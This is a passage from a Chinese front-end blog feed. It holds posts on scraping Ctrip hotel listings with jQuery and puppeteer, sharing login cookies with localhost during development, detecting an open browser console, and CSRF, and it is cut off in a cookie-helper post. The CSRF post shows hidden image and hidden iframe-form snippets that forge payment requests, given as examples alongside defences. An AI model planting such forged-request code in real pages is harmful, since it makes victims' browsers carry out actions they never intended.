class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将得到的结果写入csv文件</span></span><br><span class="line">fs.writeFile(<span class="string">'hotels.csv'</span>, hotels, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 得到csv文件会有乱码问题，可以找框架来直接转为csv文件，此处不赘述</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上只是puppet的最基本常用的功能，还可以做很多诸如：自动化测试，前端性能测试，异常监控等。</p><p>如果你在尝试过程中也对异步操作比较困惑，可以一起复习下async和await和promise，参见这篇（TODO async和await）。</p><p>puppeteer和Selenium/WebDriver的主要区别：</p><p>Selenium/WebDriver适用于多种浏览器</p><p>puppeteer主要作用于chromium，做到极致</p><p>我个人觉得API很多，看了也记不住，用到再去查。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上一篇中我们通过自己手写代码完成了抓取list页中的基本数据，可是沙沙又提出了新的需求，如何抓取到每个酒店的装修时间和客房数量呢？我让她自己去研究八爪鱼去了，但是如果是真的撩妹，这可不就前功尽弃了。&lt;/p&gt;
&lt;p&gt;正好最近在研究反作弊中判断是否是webdriver，headless chrome，发现一个神器puppeteer，不需要学习python，用nodeJS就可以搞定，我的键盘已经等不及了，用了一天时间研究，分享给大家。&lt;/p&gt;
&lt;p&gt;其实主要是async和await的理解不够深刻，多花费了时间，实际上聪明如你半个小时应该就可以学会。&lt;/p&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」前端如何爬虫</title>
    <link href="https://evacoder.com/2019/02/12/js_spider/"/>
    <id>https://evacoder.com/2019/02/12/js_spider/</id>
    <published>2019-02-12T10:20:35.000Z</published>
    <updated>2019-03-13T10:53:30.979Z</updated>
    
    <content type="html"><![CDATA[<p>本文又名十行代码帮你撩妹。</p><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天沙沙在群里向我们紧急求助，领导让她整理【携程江湾五角场地区的260家酒店的名称，价格，地址，网址，评分信息制成excel】。</p><p>PM（也是前php开发者）咕咕推荐了【八爪鱼】这个工具，不懂技术的小白也能抓取数据。</p><p>作为一个程序员，很惭愧的说自己其实没接触过爬虫，之前说的要学python也没学几天就放弃了，现学肯定来不及了，作为一个不懂python的前端，如何帮上沙沙的忙呢？<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>其实也就是返回的json处理一下嘛，我们先来看看页面的逻辑。</p><p>先访问列出这260家酒店的url：<a href="http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。" target="_blank" rel="noopener">http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。</a></p><p>在chrome devtool的network中选择xhr，凭借我们多年的工作经验，来判断下到底是哪个接口返回了hotelsList的信息。<br><img src="/images/ctrip1.png" alt=""><br>先锁定了/AjaxGetGroupProductList.aspx这个接口，本以为直接copy下json，简单处理下就完工了，顶多有个分页</p><p>需要多次请求。但是what？这个接口居然没有response body！</p><p>回想起之前看到很多反爬故事的文章都出自携程和去哪儿，怎么可能这么容易就被爬到数据呢？</p><p>分析接口这条路可能还需要点成本，冷静下思考，其实小伙伴的要求并不高，数据量也并不大，说不定只通过前端知识就可以获取到我们想要的结果。</p><p>试了试八爪鱼，看起来也是设定好需要的div，获取div。马上有了思路，既然接口hook走不通，不如前端老本行，所见即所得，通过jquery直接获取页面上的元素，界面是不可能骗人的，那我们开始写代码。</p><h4 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">  t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是酒店数据是分页显示的，只好手动一页一页的点击运行来获取。<br>Tips：<br>1.这里用到了chrome devtool的snippet，可以保存在chrome里，直接右键run一下就可以运行。比直接粘在console里要灵活。<br>2.携程本身的页面有jQuery，所以我们可以直接使用jQuery。<br><img src="/images/ctrip2.png" alt=""></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>手动翻页也太low了吧，后来惊喜的发现居然是单页应用，点击下一页并没有刷新页面，我们可以用代码来帮我们直接点击。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> t = <span class="string">'名字,地址,网址,评分,价格\n'</span>;</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">        t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">        $nextBtn.click();</span><br><span class="line">        timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">      <span class="comment">// 分页结束啦</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        <span class="built_in">console</span>.log(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getData();</span><br><span class="line">  &#125;)();</span><br></pre></td></tr></table></figure><p>这样就可以自动翻页，完成时会把我们想要的数据直接console出来。</p><p>然后再找个转csv的工具就可以啦，时间紧张，先发给沙沙吧。</p><h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>虽然这篇的技术知识很简单，可能算不上爬虫，但我们可以回过头来分析下这个例子中携程是如何做反爬的。<br>首页的数据太多太杂，点了第二页，查看了下</p><p><img src="/images/ctrip3.png" alt=""><br>/AjaxHotelList.aspx才是真正的接口，我们需要的数据实际也不是json，而直接是html信息，这样坏人需要写很多的正则来获取，需要懂一些前端知识，而且作恶成本很高。</p><p>这个接口足足有182kb的大小，性能优化和反爬需要有个平衡。</p><p>所以这种数据量比较小的，没有时间要求的，还是从前端的角度来抓取数据会更靠谱一些。</p><p>思考下首页为啥没有这个请求数据的接口呢？</p><p>可能是考虑到首页SEO及渲染速度选择了服务端直出，所以有经验了我们就是应该直奔第二页，明白套路就能少走弯路。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.接口返回的并不是规则的json数据，并不好解析，我们可以使用前端的jquery直接获取需要dom属性。</p><p>2.我们使用了chrome的<strong>Snippet</strong>功能，直接在页面中运行代码即可，还可以保存常用的util代码，比直接写在console中会优雅一些。</p><p>3.观察到是单页应用，可以自己写代码来点击切换到下一页。</p><p>4.json如何导出成excel呢？其实我们常用的一般都是csv文件，只要通过tab来分隔就可以了。</p><p>5.读取本地json文件$.getJSON</p><h4 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h4><p>虽然完成了，得到了技术小白沙沙的赞美，但是心里还是很虚。<br>主要问题有：<br>1.手动的可以全部自动化吗？<br>可以直接写入csv文件而不是copy console里的内容吗？<br>虽然传统的js是运行在浏览器中的，为了安全起见是不可以读写本地文件的，但是发现HTML5有新的API可以导出文件。但是这样还是勉强了些。</p><p>2.沙沙弱弱地说如果可以获取酒店的开业时间和房间数就好了。<br>嗷的，那还得点进去每个酒店的detail去查看，十行代码搞不定啦。<br>我知道可以使用webdriver，phantomJS等来模拟点击，具体的还有待研究。</p><p>不用担心，下篇文章我们会鸟枪换炮！</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>只需要很少的代码量就可以达到我们的需求，js真的很强大呢！前端很好玩，能把前端用在生活中那就更美妙了，可以抢火车票啥的。</p><p>心虚的说了句要赶紧学python啦。另一只小白问要怎么才能学会编程，学了几天python没有动力就不想学了。</p><p>我觉得用一劳永逸的懒人思维思考问题，慢慢自己给自己提需求，这样就能发现科技的力量和智趣。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文又名十行代码帮你撩妹。&lt;/p&gt;
&lt;h4 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h4&gt;&lt;p&gt;今天沙沙在群里向我们紧急求助，领导让她整理【携程江湾五角场地区的260家酒店的名称，价格，地址，网址，评分信息制成excel】。&lt;/p&gt;
&lt;p&gt;PM（也是前php开发者）咕咕推荐了【八爪鱼】这个工具，不懂技术的小白也能抓取数据。&lt;/p&gt;
&lt;p&gt;作为一个程序员，很惭愧的说自己其实没接触过爬虫，之前说的要学python也没学几天就放弃了，现学肯定来不及了，作为一个不懂python的前端，如何帮上沙沙的忙呢？&lt;br&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 效率 」前后端分离项目的本地代理及登录态绕过</title>
    <link href="https://evacoder.com/2019/01/05/proxy_login_state/"/>
    <id>https://evacoder.com/2019/01/05/proxy_login_state/</id>
    <published>2019-01-05T04:44:27.000Z</published>
    <updated>2019-03-13T10:25:28.681Z</updated>
    
    <content type="html"><![CDATA[<p>在开发新需求或者复现bug时，前端经常会通过代理工具将被本地修改的js，css代理到线上，这样可以不用一次一次的上线测试，在本地就可以随改随生效。</p><p>vue项目可以 <code>npm run serve</code> 本地跑起来，开发阶段接口调试时，最好能把所有localhost的本地接口全代理到【线上】，有很多方法。</p><a id="more"></a><h4 id="绕过跨域限制的方法"><a href="#绕过跨域限制的方法" class="headerlink" title="绕过跨域限制的方法"></a>绕过跨域限制的方法</h4><ol><li><p>使用vue-cli中默认带的http-proxy-middleware，具体配置参见<a href="https://github.com/chimurai/http-proxy-middleware" target="_blank" rel="noopener">http-proxy-middleware</a> 文档。</p></li><li><p>使用代理工具，fiddler 或 Charles设置cors。</p></li><li><p>使用chrome插件Allow-Control-Allow-Origin: *</p></li><li><p>让后端开启cors（尽量自给自足）。</p></li></ol><h4 id="如何绕过登录"><a href="#如何绕过登录" class="headerlink" title="如何绕过登录"></a>如何绕过登录</h4><p>但是遇到登录这个拦路虎，localhost下因为没有登录态，每次请求全部401，不能本地调试，代理完全都没用了。</p><p>后来同事分享了一个鸡贼的方法，真是个小机灵鬼~</p><p>以evacoder.com为例，因为登录态通过cookie来标志的，而此cookie下发在<code>evacoder.com</code>域下</p><p>怎么才能让localhost共享到登录态呢？</p><p>比如我npm run serve在localhost:8080，此项目需要登录态，我们可以配置host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 test.evacoder.com</span><br></pre></td></tr></table></figure><p>如果登录态的cookie不带点，也就是说子域不可访问，我们可以手动的chrome dev tool=&gt;Application=&gt;cookies下给它加个点。</p><p>这样我们测试的时候在evacoder登录之后下发了登录态，因为有代理，访问localhost:8080可以改为访问test.evacoder.com:8080就可以共享到登录态了。</p><p>少年你忘了还有丑陋的8080端口号吗？端口号不一样也是跨域的，那咋办呢？</p><p>我们还有大招nginx反向代理，nginx用处多多，此处只说怎么完成我们的需求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass    http://127.0.0.1:8080;</span><br><span class="line">        root   html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将localhost:8080代理到localhost:80端口，80端口是默认端口，这样就可以不需要丑陋的端口直接访问了。</p><h4 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h4><p>为啥要这么麻烦呢？平常调试时不也就是用fiddler把线上的文件直接代理到本地就可以了么？</p><p>因为 <code>npm run serve</code> 生成的文件放在内存中，并没有实际的路径，但是我们还是可以使用 fiddler 通过autoresponse中使用正则来完成批量代理</p><p>只需将 <code>REGEX:https://evacoder.com/(.*)$</code> 代理到 <code>http://localhost:8080/$1</code> 即可。当然我们需要只代理静态文件，剔除api的代理。</p><p>虽然这样webpack HMR就没办法直接本地即改即生效了，但是我们还有办法，sublime上的livereload插件配合chrome上的livereload，保存文件时无脑刷新，虽然傻办法，但是还是可以节省点时间。</p><p>这样在开发过程中也可以开心的代理到线上即改即生效了~虽然功能很简单但是探索的过程很有趣，社会的发展都是懒人推动的哈哈哈。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在开发新需求或者复现bug时，前端经常会通过代理工具将被本地修改的js，css代理到线上，这样可以不用一次一次的上线测试，在本地就可以随改随生效。&lt;/p&gt;
&lt;p&gt;vue项目可以 &lt;code&gt;npm run serve&lt;/code&gt; 本地跑起来，开发阶段接口调试时，最好能把所有localhost的本地接口全代理到【线上】，有很多方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="https://evacoder.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>JS检测是否打开了控制台（devtool）</title>
    <link href="https://evacoder.com/2018/12/28/js_devtool/"/>
    <id>https://evacoder.com/2018/12/28/js_devtool/</id>
    <published>2018-12-28T12:11:15.000Z</published>
    <updated>2019-03-13T10:59:11.057Z</updated>
    
    <content type="html"><![CDATA[<p>JS并没有直接提供判断检测用户是否打开devtool的API。<br>思考下，打开控制台有哪些特征呢？<br><a id="more"></a></p><p>1.按键类，用户按下了F12，cmd+i+u,右键选择审查元素等</p><p>但是打开devtool并不能用一种操作模式就能完全涵盖，不同操作系统下的键盘特征也不一样。</p><p>2.窗口宽度变化类，内部宽度变窄</p><p>Github上搜到这个 devtools-detect 只通过宽度检测加上直观的demo就可以拿到800+的stars哦。</p><p>核心代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> threshold = <span class="number">160</span>;</span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> widthThreshold = <span class="built_in">window</span>.outerWidth - <span class="built_in">window</span>.innerWidth &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> heightThreshold = <span class="built_in">window</span>.outerHeight - <span class="built_in">window</span>.innerHeight &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> orientation = widthThreshold ? <span class="string">'vertical'</span> : <span class="string">'horizontal'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(heightThreshold &amp;&amp; widthThreshold) &amp;&amp;</span><br><span class="line">      ((<span class="built_in">window</span>.Firebug &amp;&amp; <span class="built_in">window</span>.Firebug.chrome &amp;&amp; <span class="built_in">window</span>.Firebug.chrome.isInitialized) || widthThreshold || </span><br><span class="line">      heightThreshold)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!devtools.open || devtools.orientation !== orientation) &#123;</span><br><span class="line">            emitEvent(<span class="literal">true</span>, orientation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">true</span>;</span><br><span class="line">        devtools.orientation = orientation;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (devtools.open) &#123;</span><br><span class="line">            emitEvent(<span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">false</span>;</span><br><span class="line">        devtools.orientation = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br></pre></td></tr></table></figure><p>主要思路是：一直500ms的间隔来监控是否出现内外宽高度差&gt;160的情况，基本的场景都可以覆盖，除了将调试窗口从页面中拖出来的情况。虽然思路很简单，但是人家的测试用例全呀！</p><p>不得不说确实很有效，但我们可以升级下，<strong>将setInterval改为window.onresize</strong>，性能上应该会好很多<br>TODO补充代码</p><p>3.特殊特征类<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> re = <span class="regexp">/x/</span>;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(re);</span><br><span class="line"></span><br><span class="line">  re.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(i);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'第 '</span> + (++i) + <span class="string">' 次打开控制台'</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.console &amp;&amp; <span class="built_in">window</span>.console.log) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"打开了控制台"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考 </p><p><a href="https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open" target="_blank" rel="noopener">https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open</a></p><p><a href="https://github.com/sindresorhus/devtools-detect" target="_blank" rel="noopener">https://github.com/sindresorhus/devtools-detect</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JS并没有直接提供判断检测用户是否打开devtool的API。&lt;br&gt;思考下，打开控制台有哪些特征呢？&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="https://evacoder.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>「 安全 」这次，完全弄明白CSRF</title>
    <link href="https://evacoder.com/2018/12/20/crsf/"/>
    <id>https://evacoder.com/2018/12/20/crsf/</id>
    <published>2018-12-20T12:11:15.000Z</published>
    <updated>2019-03-13T11:49:55.889Z</updated>
    
    <content type="html"><![CDATA[<p>今天听小伙伴分享了下CSRF攻击的原理，这次真的弄明白了CSRF。<br><strong>CSRF(</strong>Cross Site Request Forgery) 是什么？跨站请求伪造。</p><p>通过CSRF攻击，坏人可以冒用你的身份（登录态）来做任何事情。因为登录态一般都是通过cookie来存储在浏览器中，要知道即使只是发起一个图片的请求，也会带上这个域下的所有cookie，可以做到用户完全无感知的情况下发起用户不想发出的请求。<br><a id="more"></a></p><h4 id="为啥钱被转走了"><a href="#为啥钱被转走了" class="headerlink" title="为啥钱被转走了"></a>为啥钱被转走了</h4><p>假设mi有个付钱的接口是 <code>api.mi.com/pay?money=10000&amp;x=xx</code></p><p>要知道一般登录态（serviceToken）都是存在浏览器的cookie中，有的有效期还很长，如果有一个坏人的页面<code>badman.com</code>，页面中加载一个看不见的小图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">wwww.mi.com/pay?money</span>=<span class="string">10000</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>只要我们访问这个页面，就会在我们不知情的情况下自动发请求 <code>api.mi.com/pay?money=10000</code>出去，虽然只是一个图片，一样会带上存在你浏览器中的 <code>mi.com</code>下的所有的cookie，如果这时候你已经登录了mi网，这个请求就轻松的得到了你的登录态，向服务器发出了付款的请求。坏人setInterval每秒发个请求，你的钱就哗哗的全被转走了。</p><p>一般作恶的核心是<strong>跨域</strong>，所以浏览器对于跨域有很多限制。</p><p>但是我们都知道这种通过ping img 图片跨域的方式发起的是<strong>get请求</strong>，只管请求发出去，而不管响应。<br>get请求一般只是读取操作，像付款这种写操作如果还使用get请求，第一步就被人吃干抹净，所以在接口设计中一定要注意。<br>现在我们将 <code>api.mi.com/pay?money=10000</code> 升级为post请求，如果有坏人访问就统统405，现在就可以高枕无忧了吗？</p><p><strong>post请求可以跨域吗？</strong></p><p>ajax有跨域限制，但是通过form表单的方式，post请求一样可以跨域，再加上放在iframe里，还可以不跳转页面就发送表单post请求，用户毫无感知钱就被转走了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span>　<span class="attr">action</span>=<span class="string">"http://api.mi.com"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"other"</span> <span class="attr">value</span>=<span class="string">"XXX"</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="防御CRSF"><a href="#防御CRSF" class="headerlink" title="防御CRSF"></a>防御CRSF</h4><ul><li>删改查操作使用post method是基础。</li><li><p>一般的做法是随着登录态下发一个 <code>crsf_token</code>，在之后所有post操作中都要求带上这个 <code>crsf_token</code>，axios有这个功能，不需要我们手动每次添加。 这种做法的原理是在坏人的页面中，虽然可以自动带上被攻击网站的cookie，但是他的代码在 <code>badman.com</code> 下，因为cookie的同源策略，他通过js是无法获取在mi.com域下的crsf_token cookie放在post 请求中的，crsf_token是个随机字符串都可以达到这个效果。</p></li><li><p>也可以在敏感操作中通过后端校验refer，通过refer白名单的方式来杜绝来自坏人网站的攻击。</p></li><li><p>在非常敏感的操作中可以（最好不要）牺牲一些体验要求验证码验证，要求用户必须有交互。</p></li><li><p>最好严格下发子域的cookie，避免全站通用的cookie。</p></li></ul><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>为啥只在post请求下使用 <code>crsf_token</code>呢？</p><p>之前回答post和get的区别的时候都回答的很浅，但是在这个场景下，安全无小事，你就能理解两者的区别了。</p><p>get请求你要加 <code>crsf_token</code>其实也没问题吧，只不过一般get请求是读取操作，不会修改服务器数据，一般没啥影响，不加验证也还好，毕竟加token会影响性能。一个合格的后端开发应该不会用get请求来敏感操作的，如果有，你可以教训教训他。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天听小伙伴分享了下CSRF攻击的原理，这次真的弄明白了CSRF。&lt;br&gt;&lt;strong&gt;CSRF(&lt;/strong&gt;Cross Site Request Forgery) 是什么？跨站请求伪造。&lt;/p&gt;
&lt;p&gt;通过CSRF攻击，坏人可以冒用你的身份（登录态）来做任何事情。因为登录态一般都是通过cookie来存储在浏览器中，要知道即使只是发起一个图片的请求，也会带上这个域下的所有cookie，可以做到用户完全无感知的情况下发起用户不想发出的请求。&lt;br&gt;
    
    </summary>
    
    
      <category term="HTTP" scheme="https://evacoder.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>「 缓存 」cookie实践指南</title>
    <link href="https://evacoder.com/2018/12/20/cookie/"/>
    <id>https://evacoder.com/2018/12/20/cookie/</id>
    <published>2018-12-20T12:11:15.000Z</published>
    <updated>2019-02-14T09:12:17.529Z</updated>
    
    <content type="html"><![CDATA[<p>HTTP是无状态的协议，cookie可以用来存储用户的信息方便追踪。<br><a id="more"></a></p><h4 id="封装cookie操作"><a href="#封装cookie操作" class="headerlink" title="封装cookie操作"></a>封装cookie操作</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> cookieName = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=`</span>;</span><br><span class="line">  <span class="keyword">const</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</span><br><span class="line">  <span class="keyword">let</span> cookieValue = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">    <span 